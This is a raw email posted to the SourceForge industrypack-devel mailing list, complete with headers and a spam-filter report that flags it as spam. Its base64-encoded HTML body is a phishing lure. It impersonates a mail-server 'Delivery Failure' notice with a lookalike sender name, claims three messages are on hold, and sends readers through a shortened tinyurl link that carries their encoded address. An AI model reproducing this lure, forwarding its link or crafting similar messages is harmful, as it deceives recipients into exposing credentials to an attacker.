Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 3E611C39BFB
	for <lists+industrypack-devel@lfdr.de>; Thu, 06 Nov 2025 10:08:31 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Date:Message-Id:Content-Type:Reply-To:
	List-Subscribe:List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:
	Subject:To:From:MIME-Version:Sender:Cc:Content-Transfer-Encoding:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=/cfTNn+cSSkzDIeMpmCE4olL3MWys3dVfeyV3Zo7nrg=; b=YWuWxb8jwGFxOk5NNiU2BNnEDV
	oMMXbxdhM5BuyhPvD6wOAFnvjSdJLIKnX4wI6+IU9kLcyQOj3OmEcrmB6gaPHBTgBqbLU5QEtWDsf
	UndpalloMoeHAaJjAY2IDpkmsIvYXDxN3WwRdzbVkoG9FQZenAGvn4Uv69IPg5VtD2Do=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1vGvyo-0006Kh-07
	for lists+industrypack-devel@lfdr.de;
	Thu, 06 Nov 2025 09:08:30 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) id 1vGvym-0006Kb-MP
 for industrypack-devel@lists.sourceforge.net;
 Thu, 06 Nov 2025 09:08:28 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:reply-to:To:From:MIME-Version:Content-Type:
 Sender:Date:Message-ID:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=5E07XK9Ntj3Dc6OPi1mBlAVPqQ5XapTlv6TXiFk3IL0=; b=ij9EVqN9VeO5kaLm1bUtJZ7Uoi
 0j9JasvvJacUYnehbJeR2939246STAPKCDBvS1Vp4uMhckdN/ukzAHnq4Ya5mW19RKDEi9MNMpV96
 AcyWtHZYiI3d8S0s2Zze7V5ERKURb/cvC7r+7wbUBCs+oE+Qrzg4+qO2cr8eEHuzERVo=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:reply-to:To:From:MIME-Version:Content-Type:Sender:Date:Message-ID
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=5E07XK9Ntj3Dc6OPi1mBlAVPqQ5XapTlv6TXiFk3IL0=; b=c
 cRfraq2f1yVIxZI6P5O97jB8eU/O2MrMywgjCwOzClrz8OD6C+/8JYpQNeeN3y2nk7HwTrPTqEoDI
 H8OND4xSAdTKsE0aPJjIgJ1bbrN3xPBM60iLWQGA4BDpiuV/9Ug3gLpFhsd6WCtI5u9Sy3t4IUPqR
 w3Lx72dLtIdzxCok=;
Received: from 54.2.79.34.bc.googleusercontent.com ([34.79.2.54]
 helo=[10.88.0.4]) by sfi-mx-2.v28.lw.sourceforge.com with esmtp 
 (Exim 4.95) id 1vGvym-0003oq-07
 for industrypack-devel@lists.sourceforge.net;
 Thu, 06 Nov 2025 09:08:28 +0000
MIME-Version: 1.0
From: MaiI deIivery faiIure <no-reply613@lists.sourceforge.net>
To: industrypack-devel@lists.sourceforge.net
X-Priority: 2
X-Spam-Score: 6.3 (++++++)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-2.hosts.colo.sdot.me",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Delivery Failure – Review Required 3 messages on hold –
    click Review to release. 
 
 Content analysis details:   (6.3 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  1.0 MISSING_MID            Missing Message-Id: header
  1.4 MISSING_DATE           Missing Date: header
  0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
                             [34.79.2.54 listed in wl.mailspike.net]
  1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
  1.0 TVD_RCVD_IP            Message was received from an IP address
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.4 RDNS_DYNAMIC           Delivered to internal network by host with
                             dynamic-looking rDNS
  0.9 TO_EQ_FM_DOM_HTML_ONLY To domain == From domain and HTML only
  0.4 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1vGvym-0003oq-07
Subject: [Industrypack-devel] [SPAM] lncoming maiI faiIed.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: noreply
Content-Type: multipart/mixed; boundary="===============3384153884818799941=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net
Message-Id: <E1vGvyo-0006Kh-07@sfs-ml-3.v29.lw.sourceforge.com>
Date: Thu, 06 Nov 2025 09:08:30 +0000

--===============3384153884818799941==
Content-Type: multipart/related; boundary="===============2593920356146378553=="

--===============2593920356146378553==
Content-Type: text/html; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: base64

PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0
PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNl
LXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+RGVsaXZlcnkgRmFpbHVyZSDi
gJMgUmV2aWV3IFJlcXVpcmVkPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsgbWFy
Z2luOjA7IHBhZGRpbmc6MDsgYmFja2dyb3VuZDojZmZmOyBmb250LWZhbWlseTonQ291cmllciBO
ZXcnLG1vbm9zcGFjZTsgY29sb3I6IzJjMzYzYTsgfQogICAgICAgIC53cmFwcGVyIHsgbWF4LXdp
ZHRoOjYwMHB4OyBtYXJnaW46MCBhdXRvOyB9CiAgICAgICAgLmhlYWRlciB7IHdpZHRoOjEwMCU7
IGJvcmRlcjoxcHggZG90dGVkICNkM2QzZDM7IGJvcmRlci1jb2xsYXBzZTpjb2xsYXBzZTsgfQog
ICAgICAgIC5oZWFkZXItbGVmdCB7IGJhY2tncm91bmQ6IzAyOTc0MDsgd2lkdGg6MnB4OyB9CiAg
ICAgICAgLmhlYWRlci1yaWdodCB7IGJhY2tncm91bmQ6I2YzZmZmODsgcGFkZGluZzo1cHg7IGZv
bnQtc2l6ZToxMnB4OyB9CiAgICAgICAgLmNvbnRlbnQgeyBwYWRkaW5nOjIwcHg7IGZvbnQtc2l6
ZToxM3B4OyBsaW5lLWhlaWdodDoxLjU7IH0KICAgICAgICAucHJlaGVhZGVyIHsgZm9udC1zaXpl
OjFweDsgY29sb3I6I2ZmZjsgbGluZS1oZWlnaHQ6MXB4OyBtc28taGlkZTphbGw7IG92ZXJmbG93
OmhpZGRlbjsgaGVpZ2h0OjA7IH0KICAgICAgICBoMSB7IGZvbnQtc2l6ZToxOHB4OyBjb2xvcjoj
MDAwMDY2OyBtYXJnaW46MCAwIDE1cHg7IH0KICAgICAgICAuYnRuIHsgZGlzcGxheTppbmxpbmUt
YmxvY2s7IHBhZGRpbmc6OHB4IDE2cHg7IGJhY2tncm91bmQ6IzExNTVjYzsgY29sb3I6I2ZmZjsg
dGV4dC1kZWNvcmF0aW9uOm5vbmU7IGJvcmRlci1yYWRpdXM6NHB4OyBmb250LXdlaWdodDpib2xk
OyBmb250LXNpemU6MTNweDsgfQogICAgICAgIC5mb290ZXIgeyBtYXJnaW4tdG9wOjMwcHg7IGZv
bnQtc2l6ZToxMnB4OyBjb2xvcjojNTU1OyB9CiAgICA8L3N0eWxlPgogICAgPCEtLVtpZiBtc29d
PgogICAgPG5vc2NyaXB0PgogICAgICAgIDx4bWw+CiAgICAgICAgICAgIDxvOk9mZmljZURvY3Vt
ZW50U2V0dGluZ3M+CiAgICAgICAgICAgICAgICA8bzpBbGxvd1BORy8+CiAgICAgICAgICAgICAg
ICA8bzpQaXhlbHNQZXJJbmNoPjk2PC9vOlBpeGVsc1BlckluY2g+CiAgICAgICAgICAgIDwvbzpP
ZmZpY2VEb2N1bWVudFNldHRpbmdzPgogICAgICAgIDwveG1sPgogICAgPC9ub3NjcmlwdD4KICAg
IDwhW2VuZGlmXS0tPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0icHJlaGVhZGVyIj4z
IG1lc3NhZ2VzIG9uIGhvbGQg4oCTIGNsaWNrIFJldmlldyB0byByZWxlYXNlLjwvZGl2PgoKICAg
IDxkaXYgY2xhc3M9IndyYXBwZXIiPgogICAgICAgIDx0YWJsZSByb2xlPSJwcmVzZW50YXRpb24i
IGNsYXNzPSJoZWFkZXIiPgogICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICA8dGQgY2xh
c3M9ImhlYWRlci1sZWZ0Ij4mbmJzcDs8L3RkPgogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJo
ZWFkZXItcmlnaHQiPk1lc3NhZ2UgZnJvbSBpbmR1c3RyeXBhY2stZGV2ZWxAbGlzdHMuc291cmNl
Zm9yZ2UubmV0IHNlcnZlcjwvdGQ+CiAgICAgICAgICAgIDwvdHI+CiAgICAgICAgPC90YWJsZT4K
CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDxoMT5EZWxpdmVyeSBG
YWlsdXJlPC9oMT4KCiAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgRGVsaXZlcnkgc3Rv
cHBlZCBieSA8c3Ryb25nPmxpc3RzLnNvdXJjZWZvcmdlLm5ldDwvc3Ryb25nPiBNYWlsIFNlcnZl
ci48YnI+CiAgICAgICAgICAgICAgICBBcyBvZiA8c3Ryb25nPjA2IE5vdmVtYmVyLCAyMDI1PC9z
dHJvbmc+OiA8c3Ryb25nPjMgbWVzc2FnZXMgb24gaG9sZDwvc3Ryb25nPi4KICAgICAgICAgICAg
PC9wPgoKICAgICAgICAgICAgPHA+CiAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL3Rp
bnl1cmwuY29tLzU2aG50bnd6P2V0YT1hVzVrZFhOMGNubHdZV05yTFdSbGRtVnNRR3hwYzNSekxu
TnZkWEpqWldadmNtZGxMbTVsZEE9PSIKICAgICAgICAgICAgICAgICAgIGNsYXNzPSJidG4iIHRh
cmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIG5vcmVmZXJyZXIiPgogICAgICAgICAgICAgICAg
ICAgIFJldmlldyBNZXNzYWdlcwogICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICA8L3A+
CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXIiPgogICAgICAgICAgICAgICAgTWFpbCBB
ZG1pbmlzdHJhdG9yCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+
CjwvYm9keT4KPC9odG1sPg==

--===============2593920356146378553==--


--===============3384153884818799941==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3384153884818799941==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============3384153884818799941==--

